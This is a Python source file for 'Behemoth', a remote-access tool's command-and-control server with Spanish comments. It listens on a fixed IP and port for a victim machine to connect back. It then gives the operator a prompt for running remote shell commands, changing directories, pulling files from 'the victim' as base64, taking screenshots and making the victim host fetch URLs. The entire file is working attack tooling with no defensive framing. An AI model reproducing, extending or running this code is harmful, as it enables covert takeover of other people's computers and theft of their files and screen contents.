#! /usr/bin/env python
#_*_ coding: utf8 _*_

import socket
import base64
from os import system, name

class bcolors:
    HEADER = '\033[95m'
    OKBLUE = '\033[94m'
    OKCYAN = '\033[96m'
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'

def shell():
     current_dir = target.recv(1024)
     path = current_dir.decode()
     while True:
          comando = input(bcolors.WARNING + "Behemoth ---> " + bcolors.OKGREEN + "{}:{}".format(str(ip[0]),str(ip[1])) + bcolors.ENDC + "@" + bcolors.OKBLUE + "~{}$ ".format(path) + bcolors.ENDC)
     
          if comando == "exit":
               target.send(comando.encode())
               print("Conexión con " + str(ip[0]) + ":" + str(ip[1]) + " cerrada...\n")
               break
          if comando == "help":
               print("\nBehemoth Script, version 1.0.0")
               print("\nexit                             | Cerrar conexión")
               print("download nombre_archivo          | Descargar un archivo de la víctima en el servidor | Ok")
               # print("upload ruta_archivo              | Subir un archivo al host de la víctima | X")
               print("get url                          | Descargar un archivo al host de la víctima | Ok")
               print("screenshot                       | Realizar una captura de pantalla del host de la víctima | X\n")

          elif comando[:2] == "cd":
               target.send(comando.encode())
               res = target.recv(1024)
               current_dir = res
               path = current_dir.decode()
               print("\nCambiando de directorio...\n")
          elif comando == "":
               pass
          elif comando[:8] == "download":
               target.send(comando.encode())
               with open(comando[9:], 'wb') as file_download:
                    datos = target.recv(30000)
                    file_download.write(base64.b64decode(datos))

          # falta opcion upload
          # elif comando[:6] == "upload":
          #      try:
          #           target.send(comando.encode())
          #           with open(comando[7:],'rb') as file_upload:
          #                target.send(base64.b64encode(file_upload.read()))
          #      except:
          #           print("Error")

          elif comando[:10] == "screenshot":
               count = 0
               target.send(comando.encode())
               with open("screenshot-%d.png" % count, 'wb') as screen:
                    datos = target.recv(1000000)
                    data_decode = base64.b64decode(datos)
                    if data_decode == "error":
                         print("Error al realizar el screenshot")
                    else:
                         screen.write(data_decode)
                         print("Screenshot realizado con éxito")
                         count = count + 1
          else:
               target.send(comando.encode())
               res = target.recv(30000)
               if res == "1":
                    continue
               else:
                    print("")
                    print(res.decode())



def upserver():
     clear()
     global server
     global ip
     global target

     server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
     server.bind(('10.187.19.150', 7777))
     server.listen(1)
     
     print(bcolors.WARNING + "\n")
     print(" ▄▄▄▄   ▓█████  ██░ ██ ▓█████  ███▄ ▄███▓ ▒█████  ▄▄▄█████▓ ██░ ██ ")
     print("▓█████▄ ▓█   ▀ ▓██░ ██▒▓█   ▀ ▓██▒▀█▀ ██▒▒██▒  ██▒▓  ██▒ ▓▒▓██░ ██▒")
     print("▒██▒ ▄██▒███   ▒██▀▀██░▒███   ▓██    ▓██░▒██░  ██▒▒ ▓██░ ▒░▒██▀▀██░")
     print("▒██░█▀  ▒▓█  ▄ ░▓█ ░██ ▒▓█  ▄ ▒██    ▒██ ▒██   ██░░ ▓██▓ ░ ░▓█ ░██ ")
     print("░▓█  ▀█▓░▒████▒░▓█▒░██▓░▒████▒▒██▒   ░██▒░ ████▓▒░  ▒██▒ ░ ░▓█▒░██▓")
     print("░▒▓███▀▒░░ ▒░ ░ ▒ ░░▒░▒░░ ▒░ ░░ ▒░   ░  ░░ ▒░▒░▒░   ▒ ░░    ▒ ░░▒░▒")
     print("▒░▒   ░  ░ ░  ░ ▒ ░▒░ ░ ░ ░  ░░  ░      ░  ░ ▒ ▒░     ░     ▒ ░▒░ ░")
     print(" ░    ░    ░    ░  ░░ ░   ░   ░      ░   ░ ░ ░ ▒    ░       ░  ░░ ░")
     print(" ░         ░  ░ ░  ░  ░   ░  ░       ░       ░ ░            ░  ░  ░")
     print("      ░                                                            ")
     print(bcolors.FAIL + "\nBehemoth Server OK...\n")
     print("Esperando conexión...\n")

     target, ip = server.accept()
     print("Conexión establecida con: " + str(ip[0]) + ":" + str(ip[1]) + "\n")
     print("Escribe 'help' para listar los comandos existentes\n")

def clear():
  
    # for windows
    if name == 'nt':
        _ = system('cls')
  
    # for mac and linux(here, os.name is 'posix')
    else:
        _ = system('clear')

upserver()
shell()
server.close()
